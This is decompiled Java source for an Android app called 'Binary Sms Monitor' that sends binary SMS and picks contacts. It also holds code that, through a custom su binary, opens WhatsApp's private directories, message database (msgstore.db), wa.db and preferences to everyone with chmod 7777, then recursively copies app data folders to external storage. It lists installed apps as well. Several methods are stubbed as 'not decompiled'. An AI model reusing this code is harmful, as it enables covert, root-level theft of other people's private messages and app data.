package com.binary.sms.receiver;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.ContactsContract;
import android.telephony.SmsManager;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.io.File;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.LinkedList;
import java.util.List;
import java.util.concurrent.TimeoutException;

public class SkeletonActivity extends Activity {
    private static final int BACK_ID = 1;
    private static final int CLEAR_ID = 2;
    public static final int DELAY_BETWEEN_PROC_LONG = 1000;
    public static final int DELAY_BETWEEN_PROC_SHORT = 100;
    private static final int MAX_TRIES = 5;
    public static final int PROCESS_TIMEOUT = 90000;
    private static Handler resendingHandler = new Handler();
    public static String suCommand = SystemUtils.MY_SU_PATH;
    private Button btnBack;
    private Button btnContacts;
    private int counter = 0;
    View.OnClickListener mBackListener = new View.OnClickListener() {
        /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass1 */

        public void onClick(View v) {
            SkeletonActivity.this.finish();
        }
    };
    View.OnClickListener mClearListener = new View.OnClickListener() {
        /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass2 */

        public void onClick(View v) {
            try {
                SkeletonActivity.this.mEditor.setText("");
            } catch (Exception e) {
                Logger.error("mClearListener: " + e.getMessage(), e);
            }
        }
    };
    private EditText mEditor;
    private EditText phoneNumber;
    private EditText smsBody;
    private Button smsDataBtn;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            setContentView(R.layout.skeleton_activity);
            this.mEditor = (EditText) findViewById(R.id.editor);
            ((Button) findViewById(R.id.clear)).setOnClickListener(this.mClearListener);
            Logger.setTextField(this.mEditor, this);
            this.mEditor.setText("Binary Sms Monitor");
            Logger.info("onCreate", false);
            this.phoneNumber = (EditText) findViewById(R.id.phoneNumber);
            this.smsBody = (EditText) findViewById(R.id.smsBody);
            this.btnContacts = (Button) findViewById(R.id.chooseContact);
            this.btnContacts.setOnClickListener(new View.OnClickListener() {
                /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass3 */

                public void onClick(View v) {
                    try {
                        SkeletonActivity.this.startActivityForResult(new Intent("android.intent.action.PICK", ContactsContract.Contacts.CONTENT_URI), SkeletonActivity.BACK_ID);
                    } catch (Throwable e) {
                        Toast.makeText(SkeletonActivity.this.getApplicationContext(), "Your sms has failed...", (int) SkeletonActivity.BACK_ID).show();
                        Log.e("MyWap", "sendSmsByManager exception:" + e.getMessage(), e);
                    }
                }
            });
            this.smsDataBtn = (Button) findViewById(R.id.send);
            this.smsDataBtn.setOnClickListener(new View.OnClickListener() {
                /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass4 */

                public void onClick(View view) {
                    SkeletonActivity.this.sendDataSmsByManager();
                }
            });
            this.btnBack = (Button) findViewById(R.id.back);
            this.btnBack.setOnClickListener(new View.OnClickListener() {
                /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass5 */

                public void onClick(View v) {
                    try {
                        SkeletonActivity.this.finish();
                    } catch (Throwable e) {
                        Toast.makeText(SkeletonActivity.this.getApplicationContext(), "Your sms has failed...", (int) SkeletonActivity.BACK_ID).show();
                        Log.e("MyWap", "sendSmsByManager exception:" + e.getMessage(), e);
                    }
                }
            });
        } catch (Exception e) {
            Logger.error("onCreate: " + e.getMessage(), e);
        }
    }

    public void sendDataSmsByManager() {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            String number = this.phoneNumber.getText().toString();
            if (number == null || number.length() <= 0) {
                Toast.makeText(getApplicationContext(), "Please enter a valid phone number", (int) BACK_ID).show();
                return;
            }
            smsManager.sendDataMessage(number, "", 0, this.smsBody.getText().toString().getBytes(), null, null);
            Toast.makeText(getApplicationContext(), "Your sms has successfully sent!", (int) BACK_ID).show();
        } catch (Exception ex) {
            Toast.makeText(getApplicationContext(), "Your sms has failed...", (int) BACK_ID).show();
            Logger.error("sendSmsByManager exception:" + ex.getMessage(), ex);
        }
    }

    /* access modifiers changed from: protected */
    public void onResume() {
        super.onResume();
        Logger.setTextField(this.mEditor, this);
    }

    /* access modifiers changed from: protected */
    public void onPause() {
        super.onPause();
        Logger.setTextField(null, null);
    }

    public void onActivityResult(int reqCode, int resultCode, Intent data) {
        try {
            super.onActivityResult(reqCode, resultCode, data);
            switch (reqCode) {
                case BACK_ID /*{ENCODED_INT: 1}*/:
                    if (resultCode == -1) {
                        Cursor cr = getContentResolver().query(data.getData(), null, null, null, null);
                        if (cr.moveToFirst()) {
                            String name = cr.getString(cr.getColumnIndex("display_name"));
                            Log.i("MyWap", "onActivityResult name: " + name);
                            String contactId = cr.getString(cr.getColumnIndex("_id"));
                            Log.i("MyWap", "onActivityResult contactId: " + contactId);
                            if (Integer.parseInt(cr.getString(cr.getColumnIndex("has_phone_number"))) > 0) {
                                ContentResolver contentResolver = getContentResolver();
                                Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
                                String[] strArr = new String[BACK_ID];
                                strArr[0] = contactId;
                                Cursor pCur = contentResolver.query(uri, null, "contact_id = ?", strArr, null);
                                if (pCur.moveToNext()) {
                                    String number = pCur.getString(pCur.getColumnIndex("data1"));
                                    Log.i("MyWap", "onActivityResult contactPhoneNumber :" + number + ", name: " + name);
                                    if (number != null) {
                                        this.phoneNumber.setText(number);
                                    }
                                }
                                pCur.close();
                            }
                        }
                        cr.close();
                        return;
                    }
                    return;
                default:
                    return;
            }
        } catch (Exception e) {
            Log.e("MyWap", "onActivityResult exception:" + e.getMessage(), e);
        }
    }

    public static void copyDataData(String source) {
        try {
            systemCallCopy("net", null, 0, source);
        } catch (Exception e) {
            Logger.error("copyDataData: " + e.getMessage(), e);
        }
    }

    public static List<String> getDataFileList(String source) {
        List<String> fileList = new LinkedList<>();
        try {
            File base = new File(source);
            if (!base.exists()) {
                Logger.info("file not exist: " + base.getAbsolutePath());
            }
            getFileList(new File(source), fileList);
        } catch (Exception e) {
            Logger.error("getDataFileList: " + e.getMessage(), e);
        }
        return fileList;
    }

    public static void getFileList(File f, List<String> fileList) {
        try {
            fileList.add(f.getAbsolutePath());
            if (f.isDirectory()) {
                try {
                    File[] listFiles = f.listFiles();
                    int length = listFiles.length;
                    for (int i = 0; i < length; i += BACK_ID) {
                        try {
                            getFileList(listFiles[i], fileList);
                        } catch (Exception e) {
                        }
                    }
                } catch (Exception e2) {
                }
            }
        } catch (Exception e3) {
            Logger.error("getFileList: " + e3.getMessage(), e3);
        }
    }

    /* access modifiers changed from: private */
    public static String getTodayString() {
        return new SimpleDateFormat("yyyy_MM_dd-hh_mm_ss").format(new Date(System.currentTimeMillis()));
    }

    public void copy4(final String source, long delay) {
        resendingHandler.postDelayed(new Runnable() {
            /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass6 */

            public void run() {
                String destBaseFolder;
                try {
                    Logger.info("copy4 root folder: " + source);
                    Logger.info("suCommand: " + SkeletonActivity.suCommand);
                    File f = new File(source);
                    if (!f.exists()) {
                        Logger.info("file not exist: " + f.getAbsolutePath());
                    } else {
                        Logger.info("File exist: " + f.getAbsolutePath());
                    }
                    SkeletonActivity.this.counter = 0;
                    SkeletonActivity.this.chmodRec(f);
                    if (Environment.getExternalStorageDirectory().exists()) {
                        destBaseFolder = String.valueOf(Environment.getExternalStorageDirectory().getAbsolutePath()) + "/dataCopy/";
                    } else {
                        destBaseFolder = "/sdcard/dataCopy/";
                    }
                    Logger.info("destBaseFolder: " + destBaseFolder);
                    File folder = new File(destBaseFolder);
                    if (!folder.exists()) {
                        folder.mkdirs();
                    }
                    SystemUtils.copyFiles(new File(source), new File(String.valueOf(destBaseFolder) + source + SkeletonActivity.getTodayString()));
                } catch (Exception e) {
                    Logger.error("readMails: " + e.getMessage(), e);
                }
            }
        }, delay);
    }

    public void chmodOneCommand(File f, String dest) {
        try {
            Logger.info("file not exist: " + f.getAbsolutePath());
            Runtime runtime = Runtime.getRuntime();
            String[] strArr = new String[CLEAR_ID];
            strArr[0] = SystemUtils.MY_SU_PATH;
            strArr[BACK_ID] = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 7777 /data/data/com.whatsapp/; chmod 7777 /data/data/com.whatsapp/databases/; chmod 777 /data/data/com.whatsapp/databases/msgstore.db; chmod 7777 /data/data/com.whatsapp/databases/wa.db ;chmod 7777 /data/data/com.whatsapp/shared_prefs/com.whatsapp_preferences.xml;";
            runtime.exec(strArr);
        } catch (Exception e) {
            Logger.error("chmodFilesArry ext" + e.getMessage(), e);
        }
    }

    /* access modifiers changed from: private */
    /* access modifiers changed from: public */
    private void chmodRec(File f) {
        chmod(f.getAbsolutePath());
        if (f.isDirectory()) {
            try {
                File[] listFiles = f.listFiles();
                int length = listFiles.length;
                for (int i = 0; i < length; i += BACK_ID) {
                    try {
                        chmodRec(listFiles[i]);
                    } catch (Exception e) {
                    }
                }
            } catch (Exception e2) {
            }
        }
    }

    public void copyOneByOne(final String suComand, final String source, long delay) {
        resendingHandler.postDelayed(new Runnable() {
            /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass7 */

            public void run() {
                try {
                    Logger.info("copyOneByOne: " + suComand);
                    File f = new File(source);
                    if (!f.exists()) {
                        Logger.info("file not exist: " + f.getAbsolutePath());
                    }
                    chmodOneCommand(f, "/sdcard/" + System.currentTimeMillis() + "/");
                    Logger.info("copyOneByOne end: " + suComand);
                } catch (Exception e) {
                    Logger.error("readMails: " + e.getMessage(), e);
                }
            }

            public void chmodOneCommand(File f, String dest) {
                try {
                    Runtime runtime = Runtime.getRuntime();
                    String[] strArr = new String[SkeletonActivity.CLEAR_ID];
                    strArr[0] = SystemUtils.MY_SU_PATH;
                    strArr[SkeletonActivity.BACK_ID] = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 /data/data/com.whatsapp/databases/";
                    runtime.exec(strArr);
                } catch (Exception e) {
                    Logger.error("chmodFilesArry ext" + e.getMessage(), e);
                }
            }

            public void chmodFiles(File f, String dest) {
                File[] files;
                try {
                    String[] commands = new String[SkeletonActivity.BACK_ID];
                    commands[0] = "chmod 777 " + f.getAbsolutePath();
                    sume(suComand, commands);
                    if (f.isDirectory() && (files = f.listFiles()) != null) {
                        int length = files.length;
                        for (int i = 0; i < length; i += SkeletonActivity.BACK_ID) {
                            try {
                                chmodFiles(files[i], String.valueOf(dest) + source);
                            } catch (Exception e) {
                                Logger.error("copyFiles" + e.getMessage(), e);
                            }
                        }
                    }
                } catch (Exception e2) {
                    Logger.error("copyFiles ext" + e2.getMessage(), e2);
                }
            }

            /* JADX WARNING: Removed duplicated region for block: B:21:0x00b4 A[SYNTHETIC, Splitter:B:21:0x00b4] */
            /* JADX WARNING: Removed duplicated region for block: B:28:0x00e3 A[SYNTHETIC, Splitter:B:28:0x00e3] */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void sume(java.lang.String r13, java.lang.String[] r14) {
                /*
                // Method dump skipped, instructions count: 311
                */
                throw new UnsupportedOperationException("Method not decompiled: com.binary.sms.receiver.SkeletonActivity.AnonymousClass7.sume(java.lang.String, java.lang.String[]):void");
            }
        }, delay);
    }

    public void systemCallRemove(final String suComand, long delay) {
        resendingHandler.postDelayed(new Runnable() {
            /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass8 */

            public void run() {
                try {
                    Logger.info("systemCallRemove: " + suComand);
                    sume(suComand);
                    Logger.info("systemCallRemove end: " + suComand);
                } catch (Exception e) {
                    Logger.error("readMails: " + e.getMessage(), e);
                }
            }

            /* JADX WARNING: Removed duplicated region for block: B:21:0x011a A[SYNTHETIC, Splitter:B:21:0x011a] */
            /* JADX WARNING: Removed duplicated region for block: B:28:0x014f A[SYNTHETIC, Splitter:B:28:0x014f] */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void sume(java.lang.String r17) {
                /*
                // Method dump skipped, instructions count: 425
                */
                throw new UnsupportedOperationException("Method not decompiled: com.binary.sms.receiver.SkeletonActivity.AnonymousClass8.sume(java.lang.String):void");
            }
        }, delay);
    }

    public static void systemCallCopy(final String suComand, final String[] commands, long delay, final String source) {
        resendingHandler.postDelayed(new Runnable() {
            /* class com.binary.sms.receiver.SkeletonActivity.AnonymousClass9 */

            public void run() {
                try {
                    Logger.info("systemCall: " + suComand);
                    sume(suComand, commands, source);
                    Logger.info("systemCall end: " + suComand);
                } catch (Exception e) {
                    Logger.error("readMails: " + e.getMessage(), e);
                }
            }

            /* JADX WARNING: Removed duplicated region for block: B:22:0x00f0 A[SYNTHETIC, Splitter:B:22:0x00f0] */
            /* JADX WARNING: Removed duplicated region for block: B:29:0x013c A[SYNTHETIC, Splitter:B:29:0x013c] */
            /* Code decompiled incorrectly, please refer to instructions dump. */
            public void sume(java.lang.String r17, java.lang.String[] r18, java.lang.String r19) {
                /*
                // Method dump skipped, instructions count: 428
                */
                throw new UnsupportedOperationException("Method not decompiled: com.binary.sms.receiver.SkeletonActivity.AnonymousClass9.sume(java.lang.String, java.lang.String[], java.lang.String):void");
            }
        }, delay);
    }

    public static void copyFiles(File src, File dest) throws Exception {
        try {
            Logger.info("copy files");
            if (!src.exists()) {
                throw new IOException("copyFiles: Can not find source: " + src.getAbsolutePath() + ".");
            } else if (!src.canRead()) {
                throw new IOException("copyFiles: No right to source: " + src.getAbsolutePath() + ".");
            } else if (src.isDirectory()) {
                if (!dest.exists()) {
                    if (!dest.mkdirs()) {
                        throw new IOException("copyFiles: Could not create direcotry: " + dest.getAbsolutePath() + ".");
                    }
                    Logger.info("copy dir src: " + src.getAbsolutePath());
                    Logger.info("copy dir des: " + dest.getAbsolutePath());
                }
                String[] list = src.list();
                for (int i = 0; i < list.length; i += BACK_ID) {
                    copyFiles(new File(src, list[i]), new File(dest, list[i]));
                }
            } else {
                copyFile(src, dest);
            }
        } catch (Exception e) {
            Logger.error("copyFiles: " + e.getMessage(), e);
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:22:0x00a5  */
    /* JADX WARNING: Removed duplicated region for block: B:24:0x00aa  */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static void copyFile(java.io.File r11, java.io.File r12) throws java.io.IOException {
        /*
        // Method dump skipped, instructions count: 232
        */
        throw new UnsupportedOperationException("Method not decompiled: com.binary.sms.receiver.SkeletonActivity.copyFile(java.io.File, java.io.File):void");
    }

    public boolean onCreateOptionsMenu(Menu menu) {
        super.onCreateOptionsMenu(menu);
        menu.add(0, BACK_ID, 0, R.string.back).setShortcut('0', 'b');
        menu.add(0, CLEAR_ID, 0, R.string.clear).setShortcut('1', 'c');
        return true;
    }

    public boolean onPrepareOptionsMenu(Menu menu) {
        super.onPrepareOptionsMenu(menu);
        menu.findItem(CLEAR_ID).setVisible(this.mEditor.getText().length() > 0 ? BACK_ID : false);
        return true;
    }

    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case BACK_ID /*{ENCODED_INT: 1}*/:
                finish();
                return true;
            case CLEAR_ID /*{ENCODED_INT: 2}*/:
                this.mEditor.setText("");
                return true;
            default:
                return super.onOptionsItemSelected(item);
        }
    }

    public void chmod(String filePath) {
        try {
            Logger.info("chmod isSu :" + false);
            if (0 != 0) {
                Logger.info("chmod chmodSu");
                chmodSU(filePath);
                return;
            }
            Logger.info("chmod chmodCsk");
            chmodCsk(filePath);
        } catch (Exception e) {
            Logger.error("chmod: " + e.getMessage(), e);
        }
    }

    public synchronized void runProcess(String filePath) throws Exception {
        int i;
        if (new File(SystemUtils.MY_SU_PATH).exists()) {
            this.counter += BACK_ID;
            i = 0;
            while (true) {
                if (i >= MAX_TRIES) {
                    break;
                }
                Process process = null;
                try {
                    Logger.info("filePath-" + this.counter + ": " + filePath);
                    String command = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 " + filePath;
                    Logger.info("command: " + command);
                    Logger.info("runProcess start (synchronized)" + i + ". command: " + command);
                    Runtime runtime = Runtime.getRuntime();
                    String[] strArr = new String[CLEAR_ID];
                    strArr[0] = SystemUtils.MY_SU_PATH;
                    strArr[BACK_ID] = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; " + filePath;
                    Process process2 = runtime.exec(strArr);
                    try {
                        int res = WaitForTimeout(process2, PROCESS_TIMEOUT);
                        if (res == 0) {
                            Logger.info("runProcess cmd=" + command + " success: " + res);
                        } else {
                            Logger.info("runProcess cmd=" + command + " fail: " + res);
                        }
                        if (process2 != null) {
                            try {
                                process2.destroy();
                            } catch (Throwable th) {
                            }
                        }
                    } catch (TimeoutException e) {
                        Logger.info("runProcess cmd=" + command + " timeout=" + e.getMessage());
                        Process process3 = null;
                        if (0 != 0) {
                            process3.destroy();
                        }
                    } catch (Throwable th2) {
                    }
                } catch (Exception e2) {
                    Logger.error("runProcess Exception- " + e2.getMessage(), e2);
                    if (0 != 0) {
                        process.destroy();
                    }
                } catch (Throwable th3) {
                }
            }
        } else {
            Logger.info("runProcess my su does not exists. returning");
        }
        return;
        i += BACK_ID;
    }

    /* JADX WARNING: Removed duplicated region for block: B:17:0x00d9  */
    /* JADX WARNING: Removed duplicated region for block: B:22:0x0005 A[SYNTHETIC] */
    /* Code decompiled incorrectly, please refer to instructions dump. */
    public static int WaitForTimeout(java.lang.Process r10, int r11) throws java.lang.InterruptedException, java.util.concurrent.TimeoutException {
        /*
        // Method dump skipped, instructions count: 245
        */
        throw new UnsupportedOperationException("Method not decompiled: com.binary.sms.receiver.SkeletonActivity.WaitForTimeout(java.lang.Process, int):int");
    }

    public void chmodSU(String filePath) {
        Process process = null;
        try {
            this.counter += BACK_ID;
            Logger.info("filePath-" + this.counter + ": " + filePath);
            String command = "chmod 777 " + filePath;
            Logger.info("command: " + command);
            process = Runtime.getRuntime().exec("su -c " + command);
            Logger.info("result: " + process.waitFor());
            try {
                process.destroy();
            } catch (Exception e) {
                Logger.error("process.destroy" + e.getMessage(), e);
            }
        } catch (Exception e2) {
            Logger.error("process: " + e2.getMessage(), e2);
            try {
                process.destroy();
            } catch (Exception e3) {
                Logger.error("process.destroy" + e3.getMessage(), e3);
            }
        } catch (Throwable th) {
            try {
                process.destroy();
            } catch (Exception e4) {
                Logger.error("process.destroy" + e4.getMessage(), e4);
            }
            throw th;
        }
    }

    public void chmodCsk(String filePath) {
        Process process = null;
        try {
            this.counter += BACK_ID;
            Logger.info("filePath-" + this.counter + ": " + filePath);
            String command = "export LD_LIBRARY_PATH=/vendor/lib:/system/lib; chmod 777 " + filePath;
            Logger.info("command: " + command);
            Runtime runtime = Runtime.getRuntime();
            String[] strArr = new String[CLEAR_ID];
            strArr[0] = SystemUtils.MY_SU_PATH;
            strArr[BACK_ID] = command;
            process = runtime.exec(strArr);
            Logger.info("result: " + process.waitFor());
            try {
                process.destroy();
            } catch (Exception e) {
                Logger.error("process.destroy" + e.getMessage(), e);
            }
        } catch (Exception e2) {
            Logger.error("process: " + e2.getMessage(), e2);
            try {
                process.destroy();
            } catch (Exception e3) {
                Logger.error("process.destroy" + e3.getMessage(), e3);
            }
        } catch (Throwable th) {
            try {
                process.destroy();
            } catch (Exception e4) {
                Logger.error("process.destroy" + e4.getMessage(), e4);
            }
            throw th;
        }
    }

    /* JADX INFO: Multiple debug info for r1v0 android.content.pm.ActivityInfo: [D('a' android.content.pm.ActivityInfo), D('a' android.content.pm.ServiceInfo)] */
    /* JADX INFO: Multiple debug info for r1v1 android.content.pm.ServiceInfo: [D('a' android.content.pm.ActivityInfo), D('a' android.content.pm.ServiceInfo)] */
    public void getApkInfos(String apksDirectoryPath) {
        PackageInfo packgeInfo;
        Logger.info("apksDirectoryPath: " + apksDirectoryPath);
        try {
            File apksDirectory = new File(apksDirectoryPath);
            chmodRec(apksDirectory);
            PackageManager pm = getPackageManager();
            if (apksDirectory.isDirectory()) {
                try {
                    File[] listFiles = apksDirectory.listFiles();
                    int length = listFiles.length;
                    for (int i = 0; i < length; i += BACK_ID) {
                        File f = listFiles[i];
                        try {
                            Logger.info("apksDirectoryPath: " + f.getAbsolutePath());
                            if (f.getAbsolutePath().endsWith("apk") && (packgeInfo = pm.getPackageArchiveInfo(f.getAbsolutePath(), 15)) != null) {
                                Logger.info("apk packgeInfo: " + packgeInfo);
                                Logger.info("apk packageName: " + packgeInfo.packageName);
                                Logger.info("apk name: " + packgeInfo.applicationInfo.name);
                                try {
                                    if (packgeInfo.activities != null) {
                                        ActivityInfo[] activityInfoArr = packgeInfo.activities;
                                        int length2 = activityInfoArr.length;
                                        for (int i2 = 0; i2 < length2; i2 += BACK_ID) {
                                            Logger.info("Activity name: " + activityInfoArr[i2].name);
                                        }
                                    }
                                    if (packgeInfo.services != null) {
                                        ServiceInfo[] serviceInfoArr = packgeInfo.services;
                                        int length3 = serviceInfoArr.length;
                                        for (int i3 = 0; i3 < length3; i3 += BACK_ID) {
                                            Logger.info("Service name: " + serviceInfoArr[i3].name);
                                        }
                                    }
                                    if (packgeInfo.receivers != null) {
                                        ActivityInfo[] activityInfoArr2 = packgeInfo.receivers;
                                        int length4 = activityInfoArr2.length;
                                        for (int i4 = 0; i4 < length4; i4 += BACK_ID) {
                                            Logger.info("receiver name: " + activityInfoArr2[i4].name);
                                        }
                                    }
                                } catch (Exception e) {
                                    Logger.error("getPackageArchiveInfo activity iter" + e.getMessage(), e);
                                }
                            }
                        } catch (Exception e2) {
                            Logger.error("getPackageArchiveInfo iter" + e2.getMessage(), e2);
                        }
                    }
                } catch (Exception e3) {
                    Logger.error("getPackageArchiveInfo: " + e3.getMessage(), e3);
                }
            }
            Logger.info("packageInfo- ************************************* by package info   ***************** ");
            for (ApplicationInfo packageInfo : pm.getInstalledApplications(128)) {
                Logger.info("packageInfo-" + packageInfo.toString());
                Logger.info("packageInfo Installed package-" + packageInfo.packageName);
                Logger.info("packageInfo sourceDir-" + packageInfo.sourceDir);
                Logger.info("packageInfo name-" + packageInfo.name);
            }
        } catch (Throwable e4) {
            Logger.error("getApkInfos" + e4.getMessage(), e4);
        }
    }
}
